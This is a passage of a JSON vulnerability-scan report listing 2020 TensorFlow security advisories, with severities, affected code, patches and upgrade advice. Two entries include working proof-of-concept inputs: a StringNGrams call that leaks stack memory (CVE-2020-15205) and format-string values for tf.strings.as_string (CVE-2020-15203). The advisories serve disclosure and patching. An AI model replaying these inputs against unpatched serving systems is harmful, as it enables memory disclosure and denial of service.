                "markdown": "**Vulnerability CVE-2020-15194**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15194)|\n\n### Impact\nThe `SparseFillEmptyRowsGrad` implementation has incomplete validation of the shapes of its arguments:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L235-L241\n\nAlthough `reverse_index_map_t` and `grad_values_t` are accessed in a similar pattern, only `reverse_index_map_t` is validated to be of proper shape. Hence, malicious users can pass a bad `grad_values_t` to trigger an assertion failure in `vec`, causing denial of service in serving installations.\n\n### Patches\nWe have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability is a variant of [GHSA-63xm-rx5p-xvqr](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-63xm-rx5p-xvqr)"
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15202",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15202"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15202",
              "help": {
                "text": "Vulnerability CVE-2020-15202\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15202)\n### Impact\nThe `Shard` API in TensorFlow expects the last argument to be a function taking two `int64` (i.e., `long long`) arguments:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/util/work_sharder.h#L59-L60\n\nHowever, there are several places in TensorFlow where a lambda taking `int` or `int32` arguments is being used:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L204-L205\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L317-L318\n\nIn these cases, if the amount of work to be parallelized is large enough, integer truncation occurs. Depending on how the two arguments of the lambda are used, this can result in segfaults, read/write outside of heap allocated arrays, stack overflows, or data corruption.\n\n### Patches\nWe have patched the issue in 27b417360cbd671ef55915e4bb6bb06af8b8a832 and ca8c013b5e97b1373b3bb1c97ea655e69f31a575. We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15202**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15202)|\n\n### Impact\nThe `Shard` API in TensorFlow expects the last argument to be a function taking two `int64` (i.e., `long long`) arguments:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/util/work_sharder.h#L59-L60\n\nHowever, there are several places in TensorFlow where a lambda taking `int` or `int32` arguments is being used:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L204-L205\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L317-L318\n\nIn these cases, if the amount of work to be parallelized is large enough, integer truncation occurs. Depending on how the two arguments of the lambda are used, this can result in segfaults, read/write outside of heap allocated arrays, stack overflows, or data corruption.\n\n### Patches\nWe have patched the issue in 27b417360cbd671ef55915e4bb6bb06af8b8a832 and ca8c013b5e97b1373b3bb1c97ea655e69f31a575. We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "9.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15207",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15207"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15207",
              "help": {
                "text": "Vulnerability CVE-2020-15207\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15207)\n### Impact\nTo mimic Python`s indexing with negative values, TFLite uses `ResolveAxis` to convert negative values to positive indices. However, the only check that the converted index is now valid is only present in debug builds:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reduce.h#L68-L72\n\nIf the `DCHECK` does not trigger, then code execution moves ahead with a negative index. This, in turn, results in accessing data out of bounds which results in segfaults and/or data corruption.\n### Patches\nWe have patched the issue in 2d88f470dea2671b430884260f3626b1fe99830a and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15207**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15207)|\n\n### Impact\nTo mimic Python`s indexing with negative values, TFLite uses `ResolveAxis` to convert negative values to positive indices. However, the only check that the converted index is now valid is only present in debug builds:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reduce.h#L68-L72\n\nIf the `DCHECK` does not trigger, then code execution moves ahead with a negative index. This, in turn, results in accessing data out of bounds which results in segfaults and/or data corruption.\n### Patches\nWe have patched the issue in 2d88f470dea2671b430884260f3626b1fe99830a and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "8.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15205",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15205"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15205",
              "help": {
                "text": "Vulnerability CVE-2020-15205\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15205)\n### Impact\nThe `data_splits` argument of [`tf.raw_ops.StringNGrams`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/StringNGrams) lacks validation. This allows a user to pass values that can cause heap overflow errors and even leak contents of memory\n```python\n\u003e\u003e\u003e tf.raw_ops.StringNGrams(data=[\"aa\", \"bb\", \"cc\", \"dd\", \"ee\", \"ff\"], data_splits=[0,8], separator=\" \", ngram_widths=[3], left_pad=\"\", right_pad=\"\", pad_width=0, preserve_short_sequences=False)\nStringNGrams(ngrams=\u003ctf.Tensor: shape=(6,), dtype=string, numpy=\narray([b`aa bb cc`, b`bb cc dd`, b`cc dd ee`, b`dd ee ff`,\n       b`ee ff \"xf4j\"xa7q\"x7f\"x00\"x00q\"x00\"x00\"x00\"x00\"x00\"x00\"x00\"xd8\"x9b~\"xa8q\"x7f\\x00`,\n       b`ff \"xf4j\"xa7q\"x7f\"x00\"x00q\"x00\"x00\"x00\"x00\"x00\"x00\"x00\"xd8\"x9b~\"xa8q\"x7f\\x00 \\x9b~\"xa8q\"x7f\"x00\"x00p\"xf5j\"xa7q\"x7f\"x00\"x00H\"xf8j\"xa7q\"x7f\"x00\"x00\"xf0\"xf3\"xf7\"x85q\"x7f\"x00\\x00`}\"xa6\"x00\"x00\"x00\"x00\"x00`~\"xa6\"x00\"x00\"x00\"x00\"x00\\xb0~\"xeb\"x9bq\"x7f\"x00`],...\n```\n\nAll the binary strings after `ee ff` are contents from the memory stack. Since these can contain return addresses, this data leak can be used to defeat ASLR.\n\n### Patches\nWe have patched the issue in 0462de5b544ed4731aa2fb23946ac22c01856b80 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15205**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15205)|\n\n### Impact\nThe `data_splits` argument of [`tf.raw_ops.StringNGrams`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/StringNGrams) lacks validation. This allows a user to pass values that can cause heap overflow errors and even leak contents of memory\n```python\n\u003e\u003e\u003e tf.raw_ops.StringNGrams(data=[\"aa\", \"bb\", \"cc\", \"dd\", \"ee\", \"ff\"], data_splits=[0,8], separator=\" \", ngram_widths=[3], left_pad=\"\", right_pad=\"\", pad_width=0, preserve_short_sequences=False)\nStringNGrams(ngrams=\u003ctf.Tensor: shape=(6,), dtype=string, numpy=\narray([b`aa bb cc`, b`bb cc dd`, b`cc dd ee`, b`dd ee ff`,\n       b`ee ff \"xf4j\"xa7q\"x7f\"x00\"x00q\"x00\"x00\"x00\"x00\"x00\"x00\"x00\"xd8\"x9b~\"xa8q\"x7f\\x00`,\n       b`ff \"xf4j\"xa7q\"x7f\"x00\"x00q\"x00\"x00\"x00\"x00\"x00\"x00\"x00\"xd8\"x9b~\"xa8q\"x7f\\x00 \\x9b~\"xa8q\"x7f\"x00\"x00p\"xf5j\"xa7q\"x7f\"x00\"x00H\"xf8j\"xa7q\"x7f\"x00\"x00\"xf0\"xf3\"xf7\"x85q\"x7f\"x00\\x00`}\"xa6\"x00\"x00\"x00\"x00\"x00`~\"xa6\"x00\"x00\"x00\"x00\"x00\\xb0~\"xeb\"x9bq\"x7f\"x00`],...\n```\n\nAll the binary strings after `ee ff` are contents from the memory stack. Since these can contain return addresses, this data leak can be used to defeat ASLR.\n\n### Patches\nWe have patched the issue in 0462de5b544ed4731aa2fb23946ac22c01856b80 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "9.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15195",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15195"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15195",
              "help": {
                "text": "Vulnerability CVE-2020-15195\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15195)\n### Impact\nThe implementation of `SparseFillEmptyRowsGrad` uses a double indexing pattern:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L263-L269\n\nIt is possible for `reverse_index_map(i)` to be an index outside of bounds of `grad_values`, thus resulting in a heap buffer overflow.\n\n### Patches\nWe have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15195**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15195)|\n\n### Impact\nThe implementation of `SparseFillEmptyRowsGrad` uses a double indexing pattern:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L263-L269\n\nIt is possible for `reverse_index_map(i)` to be an index outside of bounds of `grad_values`, thus resulting in a heap buffer overflow.\n\n### Patches\nWe have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "8.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15206",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15206"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15206",
              "help": {
                "text": "Vulnerability CVE-2020-15206\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15206)\n### Impact\nChanging the TensorFlow`s `SavedModel` protocol buffer and altering the name of required keys results in segfaults and data corruption while loading the model. This can cause a denial of service in products using `tensorflow-serving` or other inference-as-a-service installments.\n\nWe have added fixes to this in f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d (both going into TensorFlow 2.2.0 and 2.3.0 but not yet backported to earlier versions). However, this was not enough, as #41097 reports a different failure mode.\n\n### Patches\nWe have patched the issue in adf095206f25471e864a8e63a0f1caef53a0e3a6 and will release patch releases for all versions between 1.15 and 2.3. Patch releases for versions between 1.15 and 2.1 will also contain cherry-picks of f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Shuaike Dong, from Alipay Tian Qian Security Lab \u0026\u0026 Lab for Applied Security Research, CUHK.",
                "markdown": "**Vulnerability CVE-2020-15206**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15206)|\n\n### Impact\nChanging the TensorFlow`s `SavedModel` protocol buffer and altering the name of required keys results in segfaults and data corruption while loading the model. This can cause a denial of service in products using `tensorflow-serving` or other inference-as-a-service installments.\n\nWe have added fixes to this in f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d (both going into TensorFlow 2.2.0 and 2.3.0 but not yet backported to earlier versions). However, this was not enough, as #41097 reports a different failure mode.\n\n### Patches\nWe have patched the issue in adf095206f25471e864a8e63a0f1caef53a0e3a6 and will release patch releases for all versions between 1.15 and 2.3. Patch releases for versions between 1.15 and 2.1 will also contain cherry-picks of f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Shuaike Dong, from Alipay Tian Qian Security Lab \u0026\u0026 Lab for Applied Security Research, CUHK."
              },
              "properties": {
                "security-severity": "9.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15203",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15203"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15203",
              "help": {
                "text": "Vulnerability CVE-2020-15203\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15203)\n### Impact\nBy controlling the `fill` argument of [`tf.strings.as_string`](https://www.tensorflow.org/api_docs/python/tf/strings/as_string), a malicious attacker is able to trigger a format string vulnerability due to the way the internal format use in a `printf` call is constructed: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/as_string_op.cc#L68-L74\n\nThis can result in unexpected output:\n```python\nIn [1]: tf.strings.as_string(input=[1234], width=6, fill=`-`)                                                                     \nOut[1]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`1234  `], dtype=object)\u003e                                              \nIn [2]: tf.strings.as_string(input=[1234], width=6, fill=`+`)                                                                     \nOut[2]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([` +1234`], dtype=object)\u003e \nIn [3]: tf.strings.as_string(input=[1234], width=6, fill=\"h\")                                                                     \nOut[3]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`%6d`], dtype=object)\u003e \nIn [4]: tf.strings.as_string(input=[1234], width=6, fill=\"d\")                                                                     \nOut[4]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`12346d`], dtype=object)\u003e \nIn [5]: tf.strings.as_string(input=[1234], width=6, fill=\"o\")\nOut[5]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`23226d`], dtype=object)\u003e\nIn [6]: tf.strings.as_string(input=[1234], width=6, fill=\"x\")\nOut[6]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`4d26d`], dtype=object)\u003e\nIn [7]: tf.strings.as_string(input=[1234], width=6, fill=\"g\")\nOut[7]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`8.67458e-3116d`], dtype=object)\u003e\nIn [8]: tf.strings.as_string(input=[1234], width=6, fill=\"a\")\nOut[8]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`0x0.00ff7eebb4d4p-10226d`], dtype=object)\u003e\nIn [9]: tf.strings.as_string(input=[1234], width=6, fill=\"c\")\nOut[9]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`\\xd26d`], dtype=object)\u003e\nIn [10]: tf.strings.as_string(input=[1234], width=6, fill=\"p\")\nOut[10]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`0x4d26d`], dtype=object)\u003e\nIn [11]: tf.strings.as_string(input=[1234], width=6, fill=`m`) \nOut[11]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`Success6d`], dtype=object)\u003e\n```\n\nHowever, passing in `n` or `s` results in segmentation fault.\n\n### Patches\nWe have patched the issue in 33be22c65d86256e6826666662e40dbdfe70ee83 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15203**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15203)|\n\n### Impact\nBy controlling the `fill` argument of [`tf.strings.as_string`](https://www.tensorflow.org/api_docs/python/tf/strings/as_string), a malicious attacker is able to trigger a format string vulnerability due to the way the internal format use in a `printf` call is constructed: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/as_string_op.cc#L68-L74\n\nThis can result in unexpected output:\n```python\nIn [1]: tf.strings.as_string(input=[1234], width=6, fill=`-`)                                                                     \nOut[1]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`1234  `], dtype=object)\u003e                                              \nIn [2]: tf.strings.as_string(input=[1234], width=6, fill=`+`)                                                                     \nOut[2]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([` +1234`], dtype=object)\u003e \nIn [3]: tf.strings.as_string(input=[1234], width=6, fill=\"h\")                                                                     \nOut[3]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`%6d`], dtype=object)\u003e \nIn [4]: tf.strings.as_string(input=[1234], width=6, fill=\"d\")                                                                     \nOut[4]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`12346d`], dtype=object)\u003e \nIn [5]: tf.strings.as_string(input=[1234], width=6, fill=\"o\")\nOut[5]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`23226d`], dtype=object)\u003e\nIn [6]: tf.strings.as_string(input=[1234], width=6, fill=\"x\")\nOut[6]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`4d26d`], dtype=object)\u003e\nIn [7]: tf.strings.as_string(input=[1234], width=6, fill=\"g\")\nOut[7]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`8.67458e-3116d`], dtype=object)\u003e\nIn [8]: tf.strings.as_string(input=[1234], width=6, fill=\"a\")\nOut[8]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`0x0.00ff7eebb4d4p-10226d`], dtype=object)\u003e\nIn [9]: tf.strings.as_string(input=[1234], width=6, fill=\"c\")\nOut[9]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`\\xd26d`], dtype=object)\u003e\nIn [10]: tf.strings.as_string(input=[1234], width=6, fill=\"p\")\nOut[10]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`0x4d26d`], dtype=object)\u003e\nIn [11]: tf.strings.as_string(input=[1234], width=6, fill=`m`) \nOut[11]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([`Success6d`], dtype=object)\u003e\n```\n\nHowever, passing in `n` or `s` results in segmentation fault.\n\n### Patches\nWe have patched the issue in 33be22c65d86256e6826666662e40dbdfe70ee83 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15211",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15211"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15211",
              "help": {
                "text": "Vulnerability CVE-2020-15211\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15211)\n### Impact\nIn TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/kernel_util.cc#L36\n\nHowever, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/c/common.h#L82\n\nThis results in special casing during validation at model loading time: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L566-L580\n\nUnfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don`t expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.\n\nThis results in both read and write gadgets, albeit very limited in scope.\n\n### Patches\nWe have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15211**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15211)|\n\n### Impact\nIn TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/kernel_util.cc#L36\n\nHowever, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/c/common.h#L82\n\nThis results in special casing during validation at model loading time: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L566-L580\n\nUnfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don`t expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.\n\nThis results in both read and write gadgets, albeit very limited in scope.\n\n### Patches\nWe have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15210",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15210"
              },
              "defaultConfiguration": {
                "level": "error"
